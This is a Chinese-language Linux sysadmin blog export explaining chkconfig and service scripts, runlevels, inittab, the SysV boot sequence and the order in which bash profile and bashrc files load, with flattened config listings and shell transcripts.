service命令是系统自动到/etc/init.d目录下根据传递的服务名查找到对应的文件，然后文件执行传递操作命令（start、stop）。服务脚本是根据服务的启动脚本、查看进程来进行启动服务和查看服务状态，以及执行kill命令来停服务。 标准的服务在启动时会把启动后的进程号记录到/var/run的目录下，在/var/subsys/目录下锁定服务。因此可以根据keepalived的脚本来写注册服务。当服务进程号文件目录是非标准的，此时按照keepalived的脚本写命令会报错，需要根据服务的具体配置来写脚本找到进程号进行停，或执行服务的启动脚本执行start。 4. chkconfig命令增加一个服务：1）服务脚本必须存放在/etc/ini.d/目录下； 2）chkconfig --add servicename 123# chkconfig: 2345 21 79 服务脚本中必须写如上一行，第一列数字2345用来说明此服务的运行级别，第二列数字用来设置服务启动顺序，第三列数字用来设置服务关闭顺序。在chkconfig工具服务列表中增加此服务，此时服务会被在/etc/rc.d/rcN.d中赋予K/S入口了；S21servicename，K79servicename。 auditd实例如下： 123456[root@localhost init.d]# cat auditd #!/bin/bash## auditd This starts and stops auditd## chkconfig: 2345 11 88 12345678[root@localhost init.d]# ls -al /etc/rc.d/rc2.d/S11auditd lrwxrwxrwx. 1 root root 16 Feb 6 18:02 /etc/rc.d/rc2.d/S11auditd -&gt; ../init.d/auditd[root@localhost init.d]# ls -al /etc/rc.d/rc3.d/S11auditd lrwxrwxrwx. 1 root root 16 Feb 6 18:02 /etc/rc.d/rc3.d/S11auditd -&gt; ../init.d/auditd[root@localhost init.d]# ls -al /etc/rc.d/rc4.d/S11auditd lrwxrwxrwx. 1 root root 16 Feb 6 18:02 /etc/rc.d/rc4.d/S11auditd -&gt; ../init.d/auditd[root@localhost init.d]# ls -al /etc/rc.d/rc5.d/S11auditd lrwxrwxrwx. 1 root root 16 Feb 6 18:02 /etc/rc.d/rc5.d/S11auditd -&gt; ../init.d/auditd 1234[root@localhost init.d]# ls -al /etc/rc.d/rc1.d/K88auditd lrwxrwxrwx. 1 root root 16 Feb 6 18:02 /etc/rc.d/rc1.d/K88auditd -&gt; ../init.d/auditd[root@localhost init.d]# ls -al /etc/rc.d/rc6.d/K88auditd lrwxrwxrwx. 1 root root 16 Feb 6 18:02 /etc/rc.d/rc6.d/K88auditd -&gt; ../init.d/auditd 3）chkconfig --level 345 mysqld on chkconfig --list #列出所有的系统服务 chkconfig --del httpd #删除httpd服务 chkconfig --list mysqld #列出mysqld服务设置情况 chkconfig --level 35 mysqld on #设定mysqld在等级3和5为开机运行服务，–level 35表示操作只在等级3和5执行，on表示启动，off表示关闭 chkconfig mysqld on #设定mysqld在各等级为on，“各等级”包括2、3、4、5等级 5. 服务脚本重要行1234561.# chkconfig: 2345 55 252.# description: SSH is a protocol for secure remote shell access. # This service starts up the OpenSSH server daemon.3.# Default-Start: 2 3 4 54.# Default-Stop: 0 1 6 第一行与第3行、第4行是与的关系，无论存在哪一行chkconfig命令都可以添加服务；第二行的描述不是必须的。 第四行默认停止的优先级大于第一行和第三行的开启优先级。 例子一：将第1、3、4行全部删除，执行命令12[root@localhost ~]# chkconfig --add mysqldservice mysqld does not support chkconfig 例子二：删除第1、3行全部删除，剩下1# Default-Stop: 0 1 6 执行命令123[root@localhost ~]# chkconfig --add mysqld[root@localhost ~]# chkconfig --list|grep mysqldmysqld 0:off 1:off 2:off 3:off 4:off 5:off 6:off 关闭了1、2、3、4、5、6 例子三：删除第1行，修改第3行和第4行为：12# Default-Start: 0 3 4 5# Default-Stop: 0 3 1 6 123[root@localhost ~]# chkconfig --add mysqld[root@localhost ~]# chkconfig --list|grep mysqldmysqld 0:off 1:off 2:off 3:off 4:on 5:on 6:off 说明：因为开启设置为0、3、4、5，而关闭优先级大于开启，关闭设置了关闭0、1、3、6，所以最后剩下了4、5。 /var/lock/subsys/标准服务启动后的会生成进程锁定文件在该目录中，该文件是针对服务service而言的，判断进程服务的唯一性，防止起多个进程。 /var/run/标准服务启动后的生成进程pid文件在该目录中，该文件是针对当前进程本身而言的，判断进程启动的唯一性，避免资源的互相竞争。 12345678910111213141516服务文件放在哪里？什么时候启动？/sbin/init/etc/inittab/etc/rc.d/rc.sysinit/etc/rc.d/rc/etc/rc.d/rcN.d/etc/init.d/* 服务文件放在这里/etc/rc.d/rc.local/sbin/mingetty/bin/login/bin/bash/etc/profile/etc/profile.d/*.sh~/.bash_profile~/.bashrc/etc/bashrc","tags":[{"name":"Linux","slug":"Linux","permalink":"http://pirogue.org/tags/Linux/"},{"name":"系统","slug":"系统","permalink":"http://pirogue.org/tags/系统/"},{"name":"运维","slug":"运维","permalink":"http://pirogue.org/tags/运维/"},{"name":"配置文件","slug":"配置文件","permalink":"http://pirogue.org/tags/配置文件/"}]},{"title":"Linux启动流程","date":"2017-02-07T15:51:42.000Z","path":"2017/02/07/Linux启动流程/","text":"一、运行/sbin/init 二、读取/etc/inittab文件 三、初始化系统/etc/rc.d/rc.sysinit四、启动对应运行级别的守护进程(/etc/rc.d/rc—&gt;/etc/rc.d/rc*.d/) 五、用户自定义引导程序（/etc/rc.d/rc.local） 六、启动终端/sbin/mingetty和X-Window界面 七、登录系统/bin/login 八、加载/bin/bash，设置环境变量 1. 运行/sbin/initinit的进程号是1，init进程是系统所有进程的起点，Linux在完成核内引导以后，就开始运行init程序，Linux启动的初始化程序，所有进程的父进程。 2. 读取/etc/inittab文件init程序接着需要读取配置文件/etc/inittab。inittab是一个不可执行的文本文件，它有若干指令所组成。 在Rethat系统中，inittab内容如下所示：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273[root@localhost etc]# vi inittab ## inittab This file describes how the INIT process should set up# the system in a certain run-level.## Author: Miquel van Smoorenburg, &lt;miquels@drinkel.nl.mugnet.org&gt;## inittab This file describes how the INIT process should set up# the system in a certain run-level.## Author: Miquel van Smoorenburg, &lt;miquels@drinkel.nl.mugnet.org&gt;# Modified for RHS Linux by Marc Ewing and Donnie Barnes#&lt;!--more--&gt;# Default runlevel. The runlevels used by RHS are:# 0 - halt (Do NOT set initdefault to this)# 1 - Single user mode# 2 - Multiuser, without NFS (The same as 3, if you do not have networking)# 3 - Full multiuser mode# 4 - unused# 5 - X11# 6 - reboot (Do NOT set initdefault to this)#id:5:initdefault:# System initialization.si::sysinit:/etc/rc.d/rc.sysinitl0:0:wait:/etc/rc.d/rc 0l1:1:wait:/etc/rc.d/rc 1l2:2:wait:/etc/rc.d/rc 2l3:3:wait:/etc/rc.d/rc 3l4:4:wait:/etc/rc.d/rc 4l5:5:wait:/etc/rc.d/rc 5l6:6:wait:/etc/rc.d/rc 6# Trap CTRL-ALT-DELETEca::ctrlaltdel:/sbin/shutdown -t3 -r now# When our UPS tells us power has failed, assume we have a few minutesl0:0:wait:/etc/rc.d/rc 0l1:1:wait:/etc/rc.d/rc 1l2:2:wait:/etc/rc.d/rc 2l3:3:wait:/etc/rc.d/rc 3l4:4:wait:/etc/rc.d/rc 4l5:5:wait:/etc/rc.d/rc 5l6:6:wait:/etc/rc.d/rc 6# Trap CTRL-ALT-DELETEca::ctrlaltdel:/sbin/shutdown -t3 -r now# When our UPS tells us power has failed, assume we have a few minutes# of power left. Schedule a shutdown for 2 minutes from now.# This does, of course, assume you have powerd installed and your# UPS connected and working correctly.pf::powerfail:/sbin/shutdown -f -h +2 &quot;Power Failure; System Shutting Down&quot;# If power was restored before the shutdown kicked in, cancel it.pr:12345:powerokwait:/sbin/shutdown -c &quot;Power Restored; Shutdown Cancelled&quot;# Run gettys in standard runlevels1:2345:respawn:/sbin/mingetty tty12:2345:respawn:/sbin/mingetty tty23:2345:respawn:/sbin/mingetty tty34:2345:respawn:/sbin/mingetty tty45:2345:respawn:/sbin/mingetty tty56:2345:respawn:/sbin/mingetty tty6# Run xdm in runlevel 5x:5:respawn:/etc/X11/prefdm -nodaemon Runlevel 0 系统停机状态，系统默认运行级别不能设为0，否则不能正常启动（关机） Runlevel 1 单用户工作状态，root权限，用于系统维护，禁止远程登陆 Runlevel 2 多用户状态(没有NFS) Runlevel 3 完全的多用户状态(有NFS)，登陆后进入控制台命令行模式（服务器默认模式） Runlevel 4 系统未使用，保留 Runlevel 5 X11控制台，登陆后进入图形GUI模式 Runlevel 6 系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动（重启） 3. 初始化系统/etc/rc.d/rc.sysinit开始启动运行等级的服务前，检测与初始化系统环境，在/etc/inittab文件中有写。 它是一个bash shell脚本，是每一个运行级别都要首先运行的重要脚本。 它主要完成的工作有：激活交换分区 ，检查磁盘，加载硬件模块以及其它一些需要优先执行任务。 （1）获取网络环境与主机类型。首先会读取网络环境设置文件”/etc/sysconfig/network”，获取主机名称与默认网关等网络环境。 （2）测试与载入内存设备/proc及usb设备/sys。除了/proc外，系统会主动检测是否有usb设备，并主动加载usb驱动，尝试载入usb文件系统。 （3）决定是否启动SELinux。 （4）接口设备的检测与即插即用（pnp）参数的测试。 （5）用户自定义模块的加载。用户可以再”/etc/sysconfig/modules/*.modules”加入自定义的模块，此时会加载到系统中。 （6）加载核心的相关设置。按”/etc/sysctl.conf”这个文件的设置值配置功能。 （7）设置系统时间（clock）。 （8）设置终端的控制台的字形。 （9）设置raid及LVM等硬盘功能。 （10）以方式查看检验磁盘文件系统。 （11）进行磁盘配额quota的转换。 （12）重新以读取模式载入系统磁盘。 （13）启动quota功能。 （14）启动系统随机数设备（产生随机数功能）。 （15）清除启动过程中的临时文件。 （16）将启动信息加载到”/var/log/dmesg”文件中。 4. 启动对应运行级别的守护进程(/etc/rc.d/rc—&gt;/etc/rc.d/rc*.d/)在rc.sysinit执行后，将返回init继续其它的动作，通常接下来会执行到/etc/rc.d/rc程序。以运行级别3为例，init将执行配置文件inittab中的以下这行：1l5:5:wait:/etc/rc.d/rc 5 这一行表示以5为参数运行/etc/rc.d/rc，/etc/rc.d/rc是一个Shell脚本，它接受5作为参数，去执行/etc/rc.d /rc5.d/目录下的所有的rc启动脚本，/etc/rc.d/rc5.d/目录中的这些启动脚本实际上都是一些链接文件，而不是真正的rc启动脚本，真正的rc启动脚本实际上都是放在/etc/rc.d/init.d/目录下。而这些rc启动脚本有着类似的用法，它们一般能接受start、stop、 restart、status等参数。 /etc/rc.d/rc5.d/中的rc启动脚本通常是K或S开头的链接文件，对于以以S开头的启动脚本，将以start参数来运行。而如果发现存在相应的脚本也存在K打头的链接，而且已经处于运行态了(以/var/lock/subsys/下的文件作为标志)，则将首先以stop为参数停止这些已经启动了的守护进程，然后再重新运行。这样做是为了保证是当init改变运行级别时，所有相关的守护进程都将重启。12345678910111213141516171819202122232425262728[root@localhost rc0.d]# ls -al S01halt lrwxrwxrwx 1 root root 14 Jun 17 2016 S01halt -&gt; ../init.d/halt[root@localhost rc0.d]# runlevelN 5[root@localhost rc0.d]# vi /etc/rc.d/rc.sysinit [root@localhost rc0.d]# lsK01dnsmasq K20nfs K74haldaemon K89dundK01smartd K20rwhod K74lvm2-monitor K89hiddK02avahi-daemon K24irda K74nscd K89iscsiK02avahi-dnsconfd K25phpstudy K74ntpd K89iscsidK02NetworkManager K25squid K74rsyslog K89netplugdK02oddjobd K25sshd K75netfs K89pandK03yum-updatesd K30sendmail K85mdmonitor K89rdiscK05anacron K30spamassassin K85mdmpd K90bluetoothK05atd K35smb K85messagebus K90networkK05conman K35vncserver K85rpcgssd K91capiK05innd K35winbind K85rpcidmapd K91isdnK05jexec K44rawdevices K86nfslock K92ip6tablesK05saslauthd K50netconsole K87irqbalance K92iptablesK05wdaemon K50tux K87mcstrans K95firstbootK10cups K50vsftpd K87multipathd K95kudzuK10dc_server K50xinetd K87named K99cpuspeedK10hplip K60crond K87portmap K99microcode_ctlK10psacct K69rpcsvcgssd K87restorecond K99readahead_earlyK10tcsd K72autofs K88auditd K99readahead_laterK10xfs K73ipmi K88pcscd S00killallK12dc_client K73ypbind K88syslog S01haltK15gpm K74acpid K88wpa_supplicant 至于在每个运行级中将运行哪些守护进程，用户可以通过chkconfig或setup中的”System Services”来自行设定。 如何增加一个服务： 1.服务脚本必须存放在/etc/ini.d/目录下； 2.chkconfig –add servicename 在chkconfig工具服务列表中增加此服务，此时服务会被在/etc/rc.d/rcN.d中赋予K/S入口了； 3.chkconfig –level 345 mysqld on 修改服务的默认启动等级。 其他使用范例： chkconfig –list #列出所有的系统服务 chkconfig –del httpd #删除httpd服务 chkconfig –list mysqld #列出mysqld服务设置情况 chkconfig –level 35 mysqld on #设定mysqld在等级3和5为开机运行服务，–level 35表示操作只在等级3和5执行，on表示启动，off表示关闭 chkconfig mysqld on #设定mysqld在各等级为on，“各等级”包括2、3、4、5等级 常见的守护进程有： amd：自动安装NFS守护进程 apmd:高级电源管理守护进程 arpwatch：记录日志并构建一个在LAN接口上看到的以太网地址和IP地址对数据库 autofs：自动安装管理进程automount，与NFS相关，依赖于NIS crond：Linux下的计划任务的守护进程 named：DNS服务器 netfs：安装NFS、Samba和NetWare网络文件系统 network：激活已配置网络接口的脚本程序 nfs：打开NFS服务 portmap：RPC portmap管理器，它管理基于RPC服务的连接 sendmail：邮件服务器sendmail smb：Samba文件共享/打印服务 syslog：一个让系统引导时起动syslog和klogd系统日志守候进程的脚本 xfs：X Window字型服务器，为本地和远程X服务器提供字型集 Xinetd：支持多种网络服务的核心守护进程，可以管理wtp、sshd、telnet等服务 这些守护进程也启动完成了，rc程序也就执行完了，然后又将返回init继续下一步。 5. 用户自定义引导程序（/etc/rc.d/rc.local）一般来说，自定义的程序不需要执行上面所说的繁琐的建立shell增加链接文件的步骤，只需要将命令放在rc.local里面就可以了，这个shell脚本就是保留给用户自定义启动内容的。 12[root@localhost ~]# ls /etc/rc.d/init.d rc rc0.d rc1.d rc2.d rc3.d rc4.d rc5.d rc6.d rc.local rc.sysinit 6. 启动终端/sbin/mingetty和X-Window界面rc执行完毕后，返回init。这时基本系统环境已经设置好了，各种守护进程也已经启动了。init接下来会打开6个终端，以便用户登录系统。通过按Alt+Fn(n对应1-6)可以在这6个终端中切换。在inittab中的以下6行就是定义了6个终端： 1:2345:respawn:/sbin/mingetty tty1 2:2345:respawn:/sbin/mingetty tty2 3:2345:respawn:/sbin/mingetty tty3 4:2345:respawn:/sbin/mingetty tty4 5:2345:respawn:/sbin/mingetty tty5 6:2345:respawn:/sbin/mingetty tty6 从上面可以看出在2、3、4、5的运行级别中都将以respawn方式运行mingetty程序，mingetty程序能打开终端、设置模式。同时它会显示一个文本登录界面，这个界面就是我们经常看到的登录界面，在这个登录界面中会提示用户输入用户名，而用户输入的用户将作为参数传给login程序来验证用户的身份。 除了这6个之外还会执行”/etc/X11/prefdm -nodaemon”，这个主要启动X-Window，显示一个文本登录界面，这个界面就是我们经常看到的登录界面，在这个登录界面中会提示用户输入用户名，而用户输入的用户将作为参数传给login程序来验 证用户的身份。 7. 登录系统/bin/loginRunlevel 为5的图形方式用户登录，通过图形化的登录界面输入用户名和密码登录。登录后可以直接进入KDE、Gnome等窗口管理器。 文本方式登录： 当我们看到mingetty的登录界面时，我们就可以输入用户名和密码来登录系统了。 Linux的账号验证程序是login，login接受mingetty传来的用户名作为用户名参数。然后login会对用户名进行分析：如果用户名 不是root，且存在/etc/nologin文件，login将输出nologin文件的内容，然后退出。这通常用来系统维护时防止非root用户登 录。只有/etc/securetty中登记了的终端才允许root用户登录，如果不存在这个文件，则root可以在任何终端上登录。/etc/usertty文件用于对用户作出附加访问限制，如果不存在这个文件，则没有其他限制。 在分析完用户名后，login将搜索/etc/passwd以及/etc/shadow来验证密码以及设置账户的其它信息，比如：主目录是什么、使用何种shell。如果没有指定主目录，将默认为根目录；如果没有指定shell，将默认为/bin/bash。 login程序登录成功后，会向对应的终端再输出最近一次登录的信息（在/var/log/lastlog中有记录），并检查用户是否有新邮件(在/usr/spool/mail/的对应用户名目录下)。 8. 加载/bin/bash，设置环境变量 /bin/bash是人与Linux进行终端交互的程序 /bin/login开始设置各种环境变量：对于/bin/bash来说，系统首先寻找/etc/profile脚本文件，并执行它；然后如果用户的主目录中存在.bash_profile文件，就执行它，在这些文件中又可能调用了其它配置文件，所有的配置文件执行后后，各种环境变量也设好了，这时会出现大家熟悉的命令行提示符，到此整个启动过程就结束了。 当系统登录成功后，系统会加载环境变量用来做实例、函数、应用支持。Linux中环境变量包括系统级和用户级，系统级的环境变量是每个登录到系统的用户都要读取的系统变量，而用户级的环境变量则是该用户使用系统时加载的环境变量。 1）/etc/profile bash首先执行/etc/profile脚本 2）/etc/profile.d/*.sh /etc/profile脚本先依次执行/etc/profile.d/*.sh 123456789for i in /etc/profile.d/*.sh ; do if [ -r &quot;$i&quot; ]; then if [ &quot;$&#123;-#*i&#125;&quot; != &quot;$-&quot; ]; then . $i else . $i &gt;/dev/null 2&gt;&amp;1 fi fidone 3）~/.bash_profile 随后bash会执行~/.bash_profile脚本 1234567891011121314[root@localhost init.d]# cat ~/.bash_profile # .bash_profile# Get the aliases and functionsif [ -f ~/.bashrc ]; then . ~/.bashrcfi# User specific environment and startup programsPATH=$PATH:$HOME/binexport PATHunset USERNAME 4）~/.bashrc ～/.bash_profile脚本会执行～/.bashrc脚本 123456789101112131415161718192021222324252627[root@localhost init.d]# cat ~/.bash_profile # .bash_profile# Get the aliases and functionsif [ -f ~/.bashrc ]; then . ~/.bashrcfi# User specific environment and startup programsPATH=$PATH:$HOME/binexport PATHunset USERNAME[root@localhost init.d]# cat ~/.bashrc # .bashrc# User specific aliases and functionsalias rm=&apos;rm -i&apos;alias cp=&apos;cp -i&apos;alias mv=&apos;mv -i&apos;# Source global definitionsif [ -f /etc/bashrc ]; then . /etc/bashrcfi 5）/etc/bashrc ～/.bashrc脚本会执行/etc/bashrc脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071[root@localhost init.d]# cat /etc/bashrc # /etc/bashrc# System wide functions and aliases# Environment stuff goes in /etc/profile# are we an interactive shell?if [ &quot;$PS1&quot; ]; then if [ -z &quot;$PROMPT_COMMAND&quot; ]; then case $TERM in xterm*) if [ -e /etc/sysconfig/bash-prompt-xterm ]; then PROMPT_COMMAND=/etc/sysconfig/bash-prompt-xterm else PROMPT_COMMAND=&apos;printf &quot;\\033]0;%s@%s:%s\\007&quot; &quot;$&#123;USER&#125;&quot; &quot;$&#123;HOSTNAME%%.*&#125;&quot; &quot;$&#123;PWD/#$HOME/~&#125;&quot;&apos; fi ;; screen) if [ -e /etc/sysconfig/bash-prompt-screen ]; then PROMPT_COMMAND=/etc/sysconfig/bash-prompt-screen else PROMPT_COMMAND=&apos;printf &quot;\\033]0;%s@%s:%s\\033\\\\&quot; &quot;$&#123;USER&#125;&quot; &quot;$&#123;HOSTNAME%%.*&#125;&quot; &quot;$&#123;PWD/#$HOME/~&#125;&quot;&apos; fi ;; *) [ -e /etc/sysconfig/bash-prompt-default ] &amp;&amp; PROMPT_COMMAND=/etc/sysconfig/bash-prompt-default ;; esac fi # Turn on checkwinsize shopt -s checkwinsize [ &quot;$PS1&quot; = &quot;\\\\s-\\\\v\\\\\\$ &quot; ] &amp;&amp; PS1=&quot;[\\u@\\h \\W]\\\\$ &quot;fiif ! shopt -q login_shell ; then # We&apos;re not a login shell # Need to redefine pathmunge, it get&apos;s undefined at the end of /etc/profile pathmunge () &#123; if ! echo $PATH | /bin/egrep -q &quot;(^|:)$1($|:)&quot; ; then if [ &quot;$2&quot; = &quot;after&quot; ] ; then PATH=$PATH:$1 else PATH=$1:$PATH fi fi &#125; # By default, we want umask to get set. This sets it for non-login shell. # You could check uidgid reservation validity in # /usr/share/doc/setup-*/uidgid file if [ $UID -gt 99 ] &amp;&amp; [ &quot;`id -gn`&quot; = &quot;`id -un`&quot; ]; then umask 002 else umask 022 fi # Only display echos from profile.d scripts if we are no login shell # and interactive - otherwise just process them to set envvars for i in /etc/profile.d/*.sh; do if [ -r &quot;$i&quot; ]; then if [ &quot;$PS1&quot; ]; then . $i else . $i &gt;/dev/null 2&gt;&amp;1 fi fi done unset i unset pathmungefi# vim:ts=4:sw=4 实际上bash只执行了/etc/profile脚本，其他的脚本都是一个包含一个进行模块调用执行 /etc/profile是全局用户登录后的初始化环境变量的脚本（所有用户，需要重启生效） /etc/bashrc是每一个用户bash的全局初始化脚本 在/sbin/mingetty终端启动成功后，/bin/login进行验证登录，登录成功后使用bash或sh或其他的shell取决于/etc/passwd中的配置 ~/.bash_profile（需重启生效）和~/.bashrc是当前用户终端会话的环境变量（当前用户） ~/.bash_profile 是交互式、login 方式进入bash 运行的； ~/.bashrc 是交互式 non-login 方式进入bash 运行的； 通常二者设置大致相同，所以通常前者会调用后者。","tags":[{"name":"Linux","slug":"Linux","permalink":"http://pirogue.org/tags/Linux/"},{"name":"系统","slug":"系统","permalink":"http://pirogue.org/tags/系统/"},{"name":"运维","slug":"运维","permalink":"http://pirogue.org/tags/运维/"},{"name":"启动流程","slug":"启动流程","permalink":"http://pirogue.org/tags/启动流程/"}]}]